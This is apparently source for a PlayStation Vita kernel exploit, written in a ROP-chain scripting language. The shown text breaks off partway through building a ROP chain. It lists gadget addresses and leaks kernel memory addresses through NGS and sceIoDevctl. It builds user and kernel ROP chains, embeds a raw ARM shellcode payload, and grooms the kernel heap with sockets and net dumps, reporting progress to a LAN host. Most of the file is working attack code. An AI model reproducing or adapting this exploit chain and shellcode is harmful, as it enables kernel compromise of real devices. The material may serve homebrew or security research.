data
{
	function sceNetSyscallIoctl = 0xE0552728;
	function sceNetSyscallControl = 0xE05528A8;
	function sceNetSyscallClose = 0xE05526F8;
	
	function sceNetDumpCreate = 0xE054AFDD;
	function sceNetDumpDestroy = 0xE054AFED;
	function sceIoDevctl = 0xE000B095;
	
	function infinite_loop = 0x8940442F;
    function sceKernelDelayThread = 0x810BACA8;
	function sceKernelAllocMemBlock = 0xE0040570;
	function sceKernelGetMemBlockBase = 0xE0005954;
	
	function sceHttpCreateTemplate = 0xE0568CCD;
	function sceHttpCreateConnectionWithURL = 0xE0568D27;
	function sceHttpCreateRequestWithURL = 0xE0568DC7;
	function sceHttpSendRequest = 0xE0568E9D;
	function sceHttpAddRequestHeader = 0xE0569083;
	
    function sceKernelCreateThread = 0xE000B6B9;
	function sceKernelCreateThreadForUser = 0xE0005DE4;
    function sceKernelStartThread = 0xE000B291;
	
	function sceAppUtilInit = 0x8101A157;
	
	function socket = 0xE054AEC5;
	function connect = 0xE054AEE5;
	function send = 0xE054AF11;
	function store = 0x89C41E19;
    function add = 0x89BA3F25;
	function load = 0x8944e755;
	function equals = 0x8981E681;
	function sub = 0xE0000575;
	function memcpy = 0x810E1E11;
	function memset = 0xE0000111;
	function snprintf = 0x810E3025;
	function strlen = 0x810E33B9;
	function store_byte = 0x89887353;
	function lsr_8 = 0x894085d9;
	function and_ff_plus_0x20 = 0xe000581b;
	function xor = 0x89592797;
	function and_1 = 0x894df163;
	function lsl_2 = 0x898bbcd9;
	
	function sceAppUtilSaveSafeMemory = 0x8101F298;
	function sceAppUtilLoadSafeMemory = 0x8101F2A8;
	
	variable g_socket = -1;
	variable connection_id = -1;
	variable request_id = -1;
	variable http_template = -1;
	variable result = 0;
	variable result2 = 0;
	variable safemem_kaddr = 0;
	variable sysmem_kaddr = 0;
	variable pret = -1;
	variable free1;
	variable tester;
	variable tmp;
	variable another_hole;
	variable dump_to_free;
	variable ctr2 = 0;
	variable THID = -1;
	variable ropchain_size = 0;
	
	symbol url = "http://192.168.0.4:8000";
	symbol port = 8880;
	buffer netaddr[0x10];
	buffer outbuffer[256];
	
	buffer safebuf[0x1000];
	buffer ioctl[0x400];
	
	symbol need_sockets = 80;
	buffer sockets[need_sockets*4];
	
	buffer safemem_data[] = 
	{
		0x62, 0x76, 0x64, 0x66, 0x01, 0x00, 0x01, 0x00, 0x90, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x9C, 0xB2, 0x05, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x64, 0xB2, 0x05, 0x00, 0x36, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x88, 0x00, 0x00, 0x00,
		0xE0, 0x5C, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE1, 0x5C, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
		0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
		0x6C, 0x70, 0x63, 0x6D, 0x71, 0x32, 0x34, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 
	};
	
	buffer equality_check_buffer[8];
	symbol SCE_SYSMODULE_NGS = 0x00b;
	
	function sceSysmoduleLoadModule = 0x81001424;
	function atomic_and = 0xE0002850;
	variable status = 0x3FFFF;
	buffer eq_buffer[8];
	function vdef = 0x872177A4;
	
	symbol last_dump_size = 0x1000;
	
	buffer temp_param[4*5];
	buffer pargs[24];
	buffer mybuf[0xFC];
	buffer kernel_ropchain[9*4];
	buffer dumps_to_delete[0x24];
	buffer dumps[8];
	buffer user_ropchain[0x50];
	buffer kernel_payload[0x1000];
	
	buffer kpayload[672] =
{
    0xF8, 0xB5, 0x01, 0x46, 0x05, 0x46, 0x1B, 0x4C, 0x1B, 0x48, 0x7C, 0x44, 0x78, 0x44, 0x00, 0xF0, 
    0x45, 0xF8, 0x22, 0x46, 0x01, 0x46, 0x06, 0x46, 0x14, 0x4B, 0x28, 0x46, 0x00, 0xF0, 0x4B, 0xF8, 
    0x22, 0x46, 0x13, 0x4B, 0x31, 0x46, 0x07, 0x46, 0x28, 0x46, 0x00, 0xF0, 0x44, 0xF8, 0x04, 0x46, 
    0xB8, 0x47, 0xA0, 0x47, 0x11, 0x49, 0x44, 0x69, 0x79, 0x44, 0x20, 0x46, 0x00, 0xF0, 0x67, 0xF8, 
    0x0F, 0x49, 0x05, 0x46, 0x20, 0x46, 0x79, 0x44, 0x00, 0xF0, 0x61, 0xF8, 0x03, 0x6C, 0x03, 0xF5, 
    0x82, 0x43, 0x08, 0x33, 0x43, 0xF0, 0x01, 0x04, 0x2B, 0x6C, 0x03, 0xF5, 0xD4, 0x43, 0x5C, 0x33, 
    0x43, 0xF0, 0x01, 0x03, 0x98, 0x47, 0x00, 0x20, 0xA0, 0x47, 0xFE, 0xE7, 0x42, 0x58, 0x45, 0x3E, 
    0xD7, 0xC9, 0x70, 0xCD, 0xA4, 0x01, 0x00, 0x00, 0x98, 0x01, 0x00, 0x00, 0x8A, 0x01, 0x00, 0x00, 
    0x85, 0x01, 0x00, 0x00, 0x42, 0x1E, 0x12, 0xF8, 0x01, 0x0F, 0x11, 0xF8, 0x01, 0x3B, 0x98, 0x42, 
    0x02, 0xD1, 0x00, 0x28, 0xF7, 0xD1, 0x00, 0xE0, 0xC0, 0x1A, 0x70, 0x47, 0x38, 0xB5, 0x05, 0x46, 
    0x21, 0xF0, 0x0F, 0x04, 0x29, 0x46, 0x20, 0x1D, 0xFF, 0xF7, 0xEC, 0xFF, 0x08, 0xB1, 0x10, 0x34, 
    0xF8, 0xE7, 0x20, 0x46, 0x38, 0xBD, 0x2D, 0xE9, 0xF8, 0x43, 0x07, 0x46, 0x48, 0x6A, 0x16, 0x46, 
    0x98, 0x46, 0x10, 0xB3, 0xD1, 0xF8, 0x28, 0x90, 0x04, 0x46, 0x4C, 0x45, 0x1C, 0xD2, 0xE5, 0x19, 
    0x2E, 0xB1, 0x68, 0x69, 0xA8, 0xB1, 0x31, 0x46, 0xFF, 0xF7, 0xD4, 0xFF, 0x88, 0xB9, 0xEA, 0x88, 
    0x00, 0x21, 0x08, 0x46, 0x90, 0x42, 0x0C, 0xDA, 0xAB, 0x69, 0x01, 0xF1, 0x04, 0x0E, 0x5B, 0x58, 
    0x43, 0x45, 0x03, 0xD1, 0xEB, 0x69, 0x58, 0x58, 0xBD, 0xE8, 0xF8, 0x83, 0x01, 0x30, 0x71, 0x46, 
    0xF0, 0xE7, 0x2B, 0x88, 0x1C, 0x44, 0xE0, 0xE7, 0x00, 0x20, 0xBD, 0xE8, 0xF8, 0x83, 0x38, 0xB5, 
    0x04, 0x46, 0x0D, 0x46, 0x44, 0xB1, 0x29, 0x46, 0x04, 0xF1, 0x0C, 0x00, 0xFF, 0xF7, 0xB2, 0xFF, 
    0x10, 0xB1, 0xD4, 0xF8, 0xC8, 0x43, 0xF5, 0xE7, 0x20, 0x46, 0x38, 0xBD, 0x2D, 0xE9, 0xF8, 0x4F, 
    0x04, 0x46, 0x89, 0x46, 0x17, 0x46, 0x9A, 0x46, 0x9C, 0xB3, 0x04, 0xF1, 0x0C, 0x05, 0x49, 0x46, 
    0x28, 0x46, 0xFF, 0xF7, 0x9F, 0xFF, 0x48, 0xBB, 0xD4, 0xF8, 0x40, 0x80, 0x28, 0x46, 0x41, 0x46, 
    0xFF, 0xF7, 0xA4, 0xFF, 0x45, 0x6A, 0x0D, 0xB3, 0xD0, 0xF8, 0x28, 0xB0, 0x5D, 0x45, 0x1D, 0xD2, 
    0x05, 0xEB, 0x08, 0x06, 0x2F, 0xB1, 0x70, 0x69, 0xA8, 0xB1, 0x39, 0x46, 0xFF, 0xF7, 0x8A, 0xFF, 
    0x88, 0xB9, 0xF0, 0x88, 0x00, 0x23, 0x19, 0x46, 0x81, 0x42, 0x0C, 0xDA, 0xB2, 0x69, 0x03, 0xF1, 
    0x04, 0x0E, 0xD2, 0x58, 0x52, 0x45, 0x03, 0xD1, 0xF2, 0x69, 0xD0, 0x58, 0xBD, 0xE8, 0xF8, 0x8F, 
    0x01, 0x31, 0x73, 0x46, 0xF0, 0xE7, 0x33, 0x88, 0x1D, 0x44, 0xDF, 0xE7, 0xD4, 0xF8, 0xC8, 0x43, 
    0xCA, 0xE7, 0x20, 0x46, 0xBD, 0xE8, 0xF8, 0x8F, 0x53, 0x63, 0x65, 0x53, 0x79, 0x73, 0x6D, 0x65, 
    0x6D, 0x00, 0x53, 0x63, 0x65, 0x53, 0x79, 0x73, 0x72, 0x6F, 0x6F, 0x74, 0x46, 0x6F, 0x72, 0x4B, 
    0x65, 0x72, 0x6E, 0x65, 0x6C, 0x00, 0x53, 0x63, 0x65, 0x4E, 0x65, 0x74, 0x50, 0x73, 0x00, 0x53, 
    0x63, 0x65, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x4D, 0x67, 
    0x72, 0x00, 0x2F, 0x75, 0x73, 0x72, 0x2F, 0x6C, 0x69, 0x62, 0x2F, 0x6C, 0x64, 0x2E, 0x73, 0x6F, 
    0x2E, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
    0x18, 0x02, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x14, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 
    0xF4, 0x01, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 
    0x10, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFB, 0xFF, 0xFF, 0x6F, 
    0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x2C, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	
	buffer out_data[0x1000];
}

data : ngs
{
    function sceNgsSystemGetRequiredMemorySize = 0x8721054D;
	function sceNgsRackGetRequiredMemorySize = 0x8721091D;
	function sceNgsSystemInit = 0x8721057D;
	
	buffer pRackDesc[6*4];
	buffer pTempsize[4];
	buffer synthParams[0x100];
	variable ngsSize;
	variable systemHandle;
	variable ngs_base;
}

code : leak_sysmem_base()
{
	memset(ioctl, 0, 0x400);
    sceKernelCreateThread("iwantsysmem", infinite_loop, 0, 0,0,0,0);
	sceIoDevctl("sdstor0:", 5, "xmc-lp-ign-userext", 0x14, ioctl, 0x3FF);
	add([ioctl+0x3CC], -0x4FE7);
	return &return;
}

code : connect_sock()
{
	socket("ropsock", 2, 1, 0);
	store(&return, g_socket);
	
	// memset struct
	memset(netaddr, 0, 0x10);
	
	// populate our netaddr struct
	store_byte(0x10, netaddr);
	store_byte(2, netaddr+1);
	
	// net ordering for port
	lsr_8(port);
	store_byte(0x22, netaddr+2);

	and_ff_plus_0x20(port);
	add(&return, -0x20);
	store_byte(0xb0, netaddr+3);
	
	// write IP in format
	store_byte(192, netaddr+4);
	store_byte(168, netaddr+5);
	store_byte(0, netaddr+6);
	store_byte(4, netaddr+7);
	
	// do connection
	connect([g_socket], netaddr, 0x10);
	send([g_socket], "hello world\n", 12, 0, 0, 0);
	return 0;
}

code : check_addr(&synSys, &addr)
{
	xor([addr], 0x9E28DCCE);
	store(&return, ngs::pRackDesc);
	store(1, ngs::pRackDesc+4);
	store(1, ngs::pRackDesc+8);
	store(0, ngs::pRackDesc+0xC);
	store(1, ngs::pRackDesc+0x10);
	store(0, ngs::pRackDesc+0x14);
	
	ngs::sceNgsRackGetRequiredMemorySize([synSys], ngs::pRackDesc, ngs::pTempsize);
	equals(&return, 0x804a0002);
	
	// negate
	xor(&return, 1);
	return &return;
}

code : find_safemem_addr(&synSys, &addr, 0x10000000)
{
	snprintf(outbuffer, 256, "GOT 0x%08X\n", [addr]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	sceKernelDelayThread(5*1000*1000);
	add([addr], -0x1000+0x220);
	return &return;
}

code : print_status(&n, 0)
{
	return 0;
}

code : print_status(&n, &t)
{
	snprintf(outbuffer, 256, "Searching at 0x%08X\n", [n]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	return 0;
}

code : find_safemem_addr(&synSys, &addr, &n)
{	
	add([addr], 0x220);
	xor(&return, 0x9E28DCCE);
	store(&return, ngs::pRackDesc);
	store(1, ngs::pRackDesc+4);
	store(1, ngs::pRackDesc+8);
	store(0, ngs::pRackDesc+0xC);
	store(1, ngs::pRackDesc+0x10);
	store(0, ngs::pRackDesc+0x14);
	
	add([addr], 0x1000);
	store(&return, equality_check_buffer);
	store([equality_check_buffer], addr);
	
	ngs::sceNgsRackGetRequiredMemorySize([synSys], ngs::pRackDesc, ngs::pTempsize);
	equals(&return, 0x804a0002);
	
	// negate
	xor(&return, 1);
	
	lsl_2(&return);
	add(equality_check_buffer, &return);
	load(&return);
	store(&return, n);
	
	store([synSys], temp_param+0x0);
	store([addr], temp_param+0x4);
	store([n], temp_param+0x8);
	
	atomic_and(addr, 0x3FFFF);
	equals(&return, 0);
	print_status([n], &return);
	
	find_safemem_addr([temp_param+0x0], [temp_param+0x4], [temp_param+0x8]);
	return &return;
}

code : find_safemem_addr(&synSys, &addr)
{
	store(0x10000000, equality_check_buffer+4);
	find_safemem_addr([synSys], [addr], [addr]);
	return &return;
}

code : verify_safemem_addr(&synSys, &kaddr)
{
	store([synSys], temp_param+0x0);
	store([kaddr], temp_param+0x4);
	
	// plant the safe memory buffer
	sceAppUtilSaveSafeMemory(safemem_data, 0x90, QWORD(0));
	
	snprintf(outbuffer, 256, "Trying 0x%08X\n", [kaddr]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	// should return 1 if valid
	check_addr([synSys], [kaddr]);
	store(&return, result);
	snprintf(outbuffer, 256, "before 0x%08X\n", [result]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	// modify so NGS no longer accepts it
	store(0x12345678, result2);
	sceAppUtilSaveSafeMemory(result2, 4, QWORD(0));
	
	check_addr([temp_param+0x0], [temp_param+0x4]);
	store(&return, result2);
	snprintf(outbuffer, 256, "after 0x%08X\n", [result2]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	xor([result2], 1);
	add(&return, [result]);
	equals(&return, 2);
	return &return;
}

code : safemem_addr_ok(0)
{
	snprintf(outbuffer, 256, "ERROR: sanity test failed!!\n");
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	infinite_loop();
}

code : safemem_addr_ok(&x)
{
	snprintf(outbuffer, 256, "all is well!\n");
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	return 0;
}

code : leak_safemem_addr(&synSys)
{
	store([synSys], temp_param+0xC);
	
	// plant the safe memory buffer
	sceAppUtilSaveSafeMemory(safemem_data, 0x90, QWORD(0));
	find_safemem_addr([temp_param+0xC], 0x1000000);
	store(&return, temp_param+0x10);
	
	verify_safemem_addr([temp_param+0xC], [temp_param+0x10]);
	safemem_addr_ok(&return);
	return [temp_param+0x10];
}

code : create_sockets(&socket, 0)
{
	return 0;
}

code : create_sockets(&addr, &n)
{
	socket("", 2, 1, 0);
	store(&return, [addr]);
	add([addr], 4);
	store(&return, addr);
	
	snprintf(outbuffer, 256, "socket %i\n", [n]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	add([n], -1);
	create_sockets([addr], &return);
	return 0;
}

code : create_largest_dump_1(&sz, &dump, 1)
{
	
	store(0xBEEF0014, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	store([sz], result);
	return [dump];
}

code : create_largest_dump_2(&sz, &dump, 1)
{
	
	store(0xBEEF0052, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	store([sz], result);
	return [dump];
}

code : create_largest_dump_2(&sz, &dump, &cond)
{
	store(0xBEEF0000, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	
	sub([sz], 0x2000);
	and(&return, 0x80000000);
	equals(&return, 0x80000000);
	store(&return, cond);
	add([cond], -1);
	and(&return, [sz]);
	store(&return, sz); // if < 0x2000, sz = 0
	lsl([cond], 9);
	add([sz], &return);
	store(&return, sz); // if < 0x2000, sz += 0x200
	lsl([cond], 12);
	add([sz], &return);
	store(&return, sz); // if < 0x2000, sz += 0x1000
	
	store(0xBEEF0001, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	sceNetDumpCreate("", [sz], 0);
	store(&return, dump);
	
	and([dump], 0x80000000);
	equals(&return, 0x80000000);
	xor(&return, 1);
	store(&return, cond);
	
	store(0xBEEF0002, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	add([sz], -0xA0000);
	and(&return, 0x80000000);
	equals(&return, 0x80000000);
	xor(&return, 1);
	and(&return, [cond]); // dump < 0x80000000 && sz >= 0xA0000
	store(&return, cond);
	
	store(0xBEEF0003, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	add([cond], -1);
	and(&return, [sz]);
	store(&return, sz); // if, sz = 0
	lsl([cond], 13);
	add([sz], &return);
	store(&return, sz); // if, sz += 0x2000	
	
	store(0xBEEF0004, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	and([dump], 0x80000000);
	equals(&return, 0x80000000);
	store(&return, cond);
	
	store(0xBEEF0005, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	and([sz], 0x80000000);
	equals(&return, 0x80000000);
	xor(&return, 1);
	and(&return, [cond]);
	xor(&return, 1);
	store(&return, cond);	
	add([ctr2], 0xDEA00000);
	store(&return, result);
	add([ctr2], 1);
	store(&return, ctr2);
	sceAppUtilSaveSafeMemory(dump, 4, QWORD(0xFF8));
	create_largest_dump_1([sz], [dump], [cond]);
	return &return;
}

code : create_largest_dump_1(&sz, &dump, &cond)
{
	equals([dump], -1);
	xor(&return, 1);
	lsl(&return, 8);
	sub([sz], &return);
	store(&return, sz);
	
	sub([sz], 0x1000);
	and(&return, 0x80000000);
	equals(&return, 0x80000000);
	store(&return, cond);
	
	create_largest_dump_2([sz], [dump], [cond]);
	return &return;
}

code : create_largest_dump(&sz, 1)
{
	return 0;
}


code : create_largest_dump(&sz, &cond)
{
	store(0, ctr2);
	create_largest_dump_1([sz], -1, 0);
	return &return;
}

code : create_last_dump(&sz, 0)
{
	return [result];
}

code : create_last_dump(&sz, &n)
{
	sceNetDumpCreate("", [sz], 0);
	store(&return, result);

	add([n], -1);
	store(&return, n);
	
	and([result], 0x80000000);
	equals(&return, 0x80000000);
	add(&return, -1);
	and(&return, [n]);
	store(&return, n);
	
	create_last_dump([sz], [n]);
	return &return;
}

code : last_dump_failed(&dump, 1)
{
	// GOOD NEWS
	store(0x88880000, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	return 0;
}

code : last_dump_failed(&dump, &x)
{
	// FAILED	
	store(0xFA110000, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	store(0, 0);
}

code : last_dump_failed(&dump)
{
	and([dump], 0x80000000);
	equals(&return, 0x80000000);
	store(&return, temp_param);
	
	and([dump], 0xFF);
	equals(&return, 0xC);
	add(&return, [temp_param]);
	equals(&return, 2);
	last_dump_failed([dump], &return);
	return 0;
}

code : free_sockets(&sockets, 0)
{
	return 0;
}

code : free_sockets(&sockets, &n)
{
	load([sockets]);
	sceNetSyscallClose(&return);
	add([sockets], 8);
	store(&return, sockets);
	add([n], -2);
	store(&return, n);
	free_sockets([sockets], [n]);
	return 0;
}

code : memset32(&addr, &val, 0)
{
	return 0;
}

code : memset32(&addr, &val, &len)
{
	store([val], [addr]);
	add([addr], 4);
	store(&return, addr);
	add([len], -1);
	store(&return, len);
	memset32([addr], [val], [len]);
	return 0;
}

code : create_rop_thread(&ropchain, &size)
{
	store([ropchain], temp_param+0);
	store([size], temp_param+4);
	
	sceKernelCreateThreadForUser("", 0x89402eab, 0x10000100, pargs); // 0x89402eaa : pop {pc}
	store(&return, THID);
	
	add([ngs::ngs_base], 0x1000);
	memset32(&return, 0x89402eab, 60);
	
	add([ngs::ngs_base], 0x1000+(60*4));
	store(&return, temp_param+8);
	
	memcpy([temp_param+8], [temp_param+0], [temp_param+4]);
	
	add((60*4), [temp_param+4]);
	return &return;
}

code : entry
{
	//connect_sock();
		socket("ropsock", 2, 1, 0);
	store(&return, g_socket);
	
	// memset struct
	memset(netaddr, 0, 0x10);
	
	// populate our netaddr struct
	store_byte(0x10, netaddr);
	store_byte(2, netaddr+1);
	
	// net ordering for port
	lsr_8(port);
	store_byte(0x22, netaddr+2);

	and_ff_plus_0x20(port);
	add(&return, -0x20);
	store_byte(0xb0, netaddr+3);
	
	// write IP in format
	store_byte(192, netaddr+4);
	store_byte(168, netaddr+5);
	store_byte(0, netaddr+6);
	store_byte(2, netaddr+7);
	
	// do connection
	connect([g_socket], netaddr, 0x10);
	send([g_socket], "hello world\n", 12, 0, 0, 0);
	
	// init ngs
	sceSysmoduleLoadModule(SCE_SYSMODULE_NGS);
	
	sceKernelAllocMemBlock("", 0xC20D060, 0x8000, 0);
	sceKernelGetMemBlockBase(&return, ngs::ngs_base);
	
	store(1, ngs::synthParams+0x00);
	store(1, ngs::synthParams+0x04);
	store(64, ngs::synthParams+0x08);
	store(48000, ngs::synthParams+0x0C);
	store(1, ngs::synthParams+0x10);
	
	ngs::sceNgsSystemGetRequiredMemorySize(ngs::synthParams, ngs::ngsSize);
	
	add([ngs::ngs_base], 0x4000);
	ngs::sceNgsSystemInit(&return, [ngs::ngsSize], ngs::synthParams, ngs::systemHandle);
	store(&return, result);
	
	snprintf(outbuffer, 256, "ngs system handle: 0x%08X\n", [ngs::systemHandle]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	add([ngs::ngs_base], 0x5000);
	store(&return, result);
	add([ngs::ngs_base], 0x5100);
	sceAppUtilInit([result], &return);
	store(&return, result);
	
	snprintf(outbuffer, 256, "apputil init ret: 0x%08X\n", [result]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
		// verify safemem_addr
	
	// plant the safe memory buffer
	//sceAppUtilSaveSafeMemory(safemem_data, 0x90, 0);
	snprintf(outbuffer, 256, "STEP 1: leak\n");
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	leak_safemem_addr([ngs::systemHandle]);
	store(&return, safemem_kaddr);
	
	snprintf(outbuffer, 256, "safemem 0x%08X\n", [safemem_kaddr]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	leak_sysmem_base();
	store(&return, sysmem_kaddr);
	
	snprintf(outbuffer, 256, "Found sysmem at address 0x%08X\n", [sysmem_kaddr]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	// DO EXPLOIT
	snprintf(outbuffer, 256, "STEP 2: exploit\n");
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	store(24, pargs+0x00); // size of this struct
	store(0x1000, pargs+0x04); // stackSize
	store(0, pargs+0x08); // attr
	store(0, pargs+0x0C); // cpuAffinityMask
	store(0, pargs+0x10); // pOptParam
	store(0, pargs+0x14); // unknown use, LR
	
	store(-1, pret);
	
	store(0, mybuf+0x00); // r0
	store(0, mybuf+0x04); // r1
	store(0, mybuf+0x08); // r2
	store(0, mybuf+0x0C); // r3
	store(0, mybuf+0x10); // r4
	store(0, mybuf+0x14); // r8
	add([safemem_kaddr], -28);
	store(&return, mybuf+0x18); // vptr, r9
	
	add([sysmem_kaddr], 0x118c4); // 118c4: 	ldm	r3, {sp, lr, pc}
	store(&return, user_ropchain); // init/r4
	
	// build payload
	add([safemem_kaddr], 8);
	store(&return, kernel_payload+0x00); // sp
	store(0, kernel_payload+0x04); // lr
	add([sysmem_kaddr], 0x00024c99); // 0x00024c98 : pop {r0, r1, r2, r3, r4, pc}
	store(&return, kernel_payload+0x08); // pc
	
	add([sysmem_kaddr], 0x00027520); // strings, shellcode destination
	store(&return, user_ropchain+0x08); // r0
	add([safemem_kaddr], 0x200); // shell code location
	store(&return, user_ropchain+0x0C); // r1
	store(0x300, user_ropchain+0x10); // r2
	add([sysmem_kaddr], 0x19D61); // dacr memcpy
	store(&return, user_ropchain+0x14); // r3
	store(0, user_ropchain+0x18); // r4
	add([sysmem_kaddr], 0x000049af); // 0x000049ae : blx r3 ; pop {r3, pc}
	//add([sysmem_kaddr], 0x1DF31); // 0x00026870 : ldm.w r0!, {r1, r6, r8, sl, fp, ip, sp, pc}
	store(&return, user_ropchain+0x1C); // pc
	store(0, user_ropchain+0x20); // r3
	add([sysmem_kaddr], 0x00024c99); // 0x00024c98 : pop {r0, r1, r2, r3, r4, pc}
	store(&return, user_ropchain+0x24); // pc
	store([sysmem_kaddr], user_ropchain+0x28); // r0
	store(out_data, user_ropchain+0x2C); // r1
	store(0, user_ropchain+0x30); // r2
	store(0, user_ropchain+0x34); // r3
	store(0, user_ropchain+0x38); // r4
	add([sysmem_kaddr], 0x00027521); // execute shellcode
	store(&return, user_ropchain+0x3C); // pc
	
	// memcpy to ngs_base
	memcpy([ngs::ngs_base], user_ropchain, 0x40);
	
	// TEMPORARY SHELLCODE
	add([ngs::ngs_base], 0x200);
	memcpy(&return, kpayload, 0x300);
	
	// write to kernel space
	sceAppUtilSaveSafeMemory([ngs::ngs_base], 0xf00, QWORD(0));
	
	// create a lot of sockets
	create_sockets(sockets, need_sockets);
	
	socket("", 2, 1, 0);
	store(&return, free1);
	
	socket("tester", 2, 7, 0);
	store(&return, tester);
	
	snprintf(outbuffer, 256, "tester socket 0x%08X\n", [tester]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	socket("tmp", 2, 1, 0);
	store(&return, tmp);

	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x0);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x4);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x8);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0xC);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x10);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x14);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x18);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x1C);
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, dumps_to_delete+0x20);
	
	sceNetDumpCreate("", 0xF00, 0);
	store(&return, another_hole);
	
	sceNetDumpCreate("", 0x1000, 0);
	store(&return, dump_to_free);
	
	snprintf(outbuffer, 256, "dump_to_free: 0x0x%08X\n", [dump_to_free]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	snprintf(outbuffer, 256, "now free some stuffs and create holes...\n");
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	// free some memory and create holes
	sceNetDumpDestroy([dumps_to_delete+0x00]);
	sceNetDumpDestroy([dumps_to_delete+0x08]);
	sceNetDumpDestroy([dumps_to_delete+0x10]);
	sceNetDumpDestroy([dumps_to_delete+0x18]);
	sceNetDumpDestroy([dumps_to_delete+0x20]);
	
	// thread stuff
	// build user ropchain
	store(0x89479809, user_ropchain+0x0); // 0x89479808 : pop {r0, r1, r2, r4, pc}
	store([tester], user_ropchain+0x4); // r0
	store(0x90007300, user_ropchain+0x8); // r1
	store(kernel_payload, user_ropchain+0xC); // r2
	store(sceNetSyscallIoctl, user_ropchain+0x10); // r4
	store(0x894171cf, user_ropchain+0x14); // 0x894171ce : blx r4 ; pop {r4, pc}
	store(pret, user_ropchain+0x18); // r4
